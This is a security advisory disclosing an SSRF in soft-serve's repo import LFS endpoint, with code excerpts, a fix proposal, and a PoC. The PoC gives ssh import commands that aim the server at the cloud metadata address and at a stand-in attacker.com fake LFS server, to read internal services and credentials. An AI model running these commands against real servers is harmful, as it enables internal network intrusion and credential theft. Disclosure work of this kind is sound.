# soft-serve vulnerable to SSRF via unvalidated LFS endpoint in repo import

**GHSA**: GHSA-3fvx-xrxq-8jvv | **CVE**: CVE-2026-30832 | **Severity**: critical (CVSS 9.1)

**CWE**: CWE-918

**Affected Packages**:
- **github.com/charmbracelet/soft-serve** (go): >= 0.6.0, < 0.11.4

## Description

While auditing the codebase in the wake of the webhook SSRF fix shipped in v0.11.1 (GHSA-vwq2-jx9q-9h9f), it was identified that the LFS import path was never given the same treatment. The webhook fix introduced dual-layer SSRF protection — ValidateWebhookURL() at creation time and secureHTTPClient with IP validation at dial time — but the LFS HTTP client still uses http.DefaultClient with no filtering at all.

### Summary

An authenticated SSH user can force the server to make HTTP requests to internal/private IP addresses by running `repo import` with a crafted `--lfs-endpoint` URL. The initial batch request is blind (the response from a metadata endpoint won't parse as valid LFS JSON), but an attacker hosting a fake LFS server can chain this into full read access to internal services by returning download URLs that point at internal targets.

### Details

The user-controlled endpoint flows through four files with zero validation:

**1. User supplies the URL via `--lfs-endpoint`** (`pkg/ssh/cmd/import.go:20-41`)

```go
cmd.Flags().StringVarP(&lfsEndpoint, "lfs-endpoint", "", "", "set the Git LFS endpoint")
```

The flag value is passed directly into `proto.RepositoryOptions{LFSEndpoint: lfsEndpoint}` at line 40 and then to `be.ImportRepository()`.

**2. Access check passes for any authenticated user** (`pkg/ssh/cmd/cmd.go:172-187`, `pkg/backend/user.go:94-100`)

The import command uses `checkIfCollab` as its `PersistentPreRunE`. For a new repo name (which is normal during import -- you're creating it), `AccessLevelForUser` hits this path:

```go
// pkg/backend/user.go:94-100
if user != nil {
    // If the repository doesn't exist, the user has read/write access.
    if anon > access.ReadWriteAccess {
        return anon
    }

    return access.ReadWriteAccess
}
```

This is by design -- any authenticated user can create repos via import or push (same model as Gitea/Gogs). The point isn't that the access control is wrong, just that any valid SSH key is enough to trigger the SSRF.

**3. Endpoint flows to the LFS client unvalidated** (`pkg/backend/repo.go:170-194`)

```go
// pkg/backend/repo.go:170-173
endpoint := remote
if opts.LFSEndpoint != "" {
    endpoint = opts.LFSEndpoint
}
```

When `opts.LFSEndpoint` is non-empty, it overrides the remote URL entirely. No URL validation, no IP check. It then flows through:

```go
// pkg/backend/repo.go:182-194
ep, err := lfs.NewEndpoint(endpoint)
// ...
client := lfs.NewClient(ep)
// ...
if err := StoreRepoMissingLFSObjects(ctx, r, d.db, d.store, client); err != nil {
```

`lfs.NewEndpoint` does URL parsing only -- no SSRF validation. `lfs.NewClient` calls `newHTTPClient`.

**4. HTTP client has no protection** (`pkg/lfs/http_client.go:24-31`)

```go
// pkg/lfs/http_client.go:24-31
func newHTTPClient(endpoint Endpoint) *httpClient {
    return &httpClient{
        client:   http.DefaultClient,
        endpoint: endpoint,
        transfers: map[string]TransferAdapter{
            TransferBasic: &BasicTransferAdapter{http.DefaultClient},
        },
    }
}
```

Both the batch client and the `BasicTransferAdapter` use `http.DefaultClient` -- no SSRF protection, no IP validation, follows redirects. Compare with the webhook client that was added in v0.11.1:

```go
// pkg/webhook/webhook.go:42-76 -- the protected version
var secureHTTPClient = &http.Client{
    Timeout: 30 * time.Second,
    Transport: &http.Transport{
        DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
            host, _, err := net.SplitHostPort(addr)
            // ...
            ip := net.ParseIP(host)
            if ip != nil {
                if err := ValidateIPBeforeDial(ip); err != nil {
                    return nil, fmt.Errorf("blocked connection to private IP: %w", err)
                }
            }
            // ...
        },
    },
    CheckRedirect: func(*http.Request, []*http.Request) error {
        return http.ErrUseLastResponse
    },
}
```

**How the attack chains together:**

*Stage 1 -- blind SSRF:* The server sends a POST to `<attacker-endpoint>/objects/batch` (see `http_client.go:57`). If the endpoint is a cloud metadata service like `http://169.254.169.254/latest/meta-data/`, the response won't be valid JSON, so the batch request fails with a parse error. The request is still sent though -- the attacker can confirm reachability via timing or error differentiation.

*Stage 2 -- reading internal responses via fake LFS server:* If the attacker hosts a fake LFS server that returns valid batch responses, the `BasicTransferAdapter` follows the download URLs from the response:

```go
// pkg/lfs/basic_transfer.go:71-89
func (a *BasicTransferAdapter) performRequest(ctx context.Context, method string, l *Link, body io.Reader, callback func(*http.Request)) (*http.Response, error) {
    // ...
    req, err := http.NewRequestWithContext(ctx, method, l.Href, body)  // l.Href from batch response
    // ...
    res, err := a.client.Do(req)  // a.client is http.DefaultClient
```

The `l.Href` field comes from the attacker's batch response. The `a.client` is the same unprotected `http.DefaultClient`. So the fake LFS server can point download URLs at internal targets like `http://169.254.169.254/latest/api/token` or `http://10.0.0.1:8080/admin`, and the response bodies get written to LFS object storage on disk. Since the attacker just created the repo and has read access, they can retrieve the stored objects through the normal LFS download API.

**Mirror sync persistence:** When a repo is imported with `--lfs-endpoint`, the URL is persisted in the repo's git config at `lfs.url` (`repo.go:175`). If imported as a mirror (`--mirror`), the periodic sync job reads this config and uses the same unprotected LFS client:

```go
// pkg/jobs/mirror.go:94-111
lfsEndpoint := rcfg.Section("lfs").Option("url")
if lfsEndpoint == "" {
    return
}

ep, err := lfs.NewEndpoint(lfsEndpoint)
// ...
client := lfs.NewClient(ep)
// ...
if err := backend.StoreRepoMissingLFSObjects(ctx, repo, dbx, datastore, client); err != nil {
```

A single `--mirror --lfs --lfs-endpoint <internal-url>` import creates persistent SSRF that repeats on every mirror sync without further interaction.

**Two notes:**

- The batch request only fires if the imported repo contains LFS pointer blobs (checked via `SearchPointerBlobs`). The attacker needs to import a repo that has LFS objects -- easy to arrange with your own repo, but worth noting.
- The import path in `repo.go` does not check the global `cfg.LFS.Enabled` flag -- it always processes LFS when the `--lfs` flag is passed. The mirror path (`mirror.go:87`) does gate on `cfg.LFS.Enabled`. So the import vector works regardless of server-level LFS configuration.

**Protection comparison:**

| Layer | Webhooks (v0.11.1+) | LFS import/mirror |
|---|---|---|
| URL validation at input | `ValidateWebhookURL()` | None |
| Custom HTTP transport | `secureHTTPClient` with `ValidateIPBeforeDial` | `http.DefaultClient` |
| Redirect blocking | `CheckRedirect` returns `http.ErrUseLastResponse` | Default (follows redirects) |
| DNS rebinding protection | IP checked at dial time | None |

**Affected versions:**

- Introduced in v0.6.0 (commit `ea6b9a4` added `--lfs-endpoint` flag)
- Still present in v0.11.3+ (current `main`)
- Not fixed by v0.11.1 webhook SSRF patch (GHSA-vwq2-jx9q-9h9f) -- that fix only covers `pkg/webhook/`, not `pkg/lfs/`

**Suggested fix:**

The existing SSRF protections in `pkg/webhook/validator.go` and `pkg/webhook/webhook.go` are thorough and well-tested. The cleanest fix would be to extract them to a shared internal package and apply them to the LFS client:

1. Replace `http.DefaultClient` in `pkg/lfs/http_client.go` with a secure client using `ValidateIPBeforeDial` in the transport and `http.ErrUseLastResponse` in `CheckRedirect` -- matching the webhook pattern.
2. Validate the endpoint URL in `pkg/backend/repo.go` (before `lfs.NewEndpoint`) and `pkg/jobs/mirror.go` (before creating the client) using the same checks `ValidateWebhookURL` performs.

Both layers matter -- URL validation catches the obvious cases, `ValidateIPBeforeDial` at connection time catches DNS rebinding.


### PoC

Based on code review. These haven't been run against a live instance, but the data flow from `--lfs-endpoint` to `http.DefaultClient.Do()` is straightforward:

```bash
# Blind SSRF -- server POSTs to metadata endpoint (JSON parse will fail, but request is sent)
ssh -p 23231 localhost repo import ssrf-test https://github.com/user/lfs-repo \
  --lfs --lfs-endpoint http://169.254.169.254/latest/meta-data/

# Reading internal responses via fake LFS server
# 1. Host a server at attacker.com that responds to POST /objects/batch
#    with a valid BatchResponse containing download URLs pointing at internal targets
# 2. Import with that endpoint
ssh -p 23231 localhost repo import ssrf-chain https://github.com/user/lfs-repo \
  --lfs --lfs-endpoint http://attacker.com/fake-lfs/
```

### Impact

Any authenticated SSH user (any valid SSH key) can make the server send HTTP requests to arbitrary destinations, including internal networks and cloud metadata services.

Concrete impact:
- **Port scanning / service discovery:** Confirm reachability of internal hosts via timing and error responses
- **Cloud credential theft:** Access cloud metadata endpoints (169.254.169.254) -- full credential extraction is possible through the fake-LFS-server chain unless IMDSv2 or equivalent is enforced
- **Internal API access:** Read responses from internal services by routing LFS download URLs through the pipeline
- **Persistence:** Mirror imports repeat the SSRF on every scheduled sync without further user action


Reported by Vinayak Mishra
GitHub: @vnykmshr
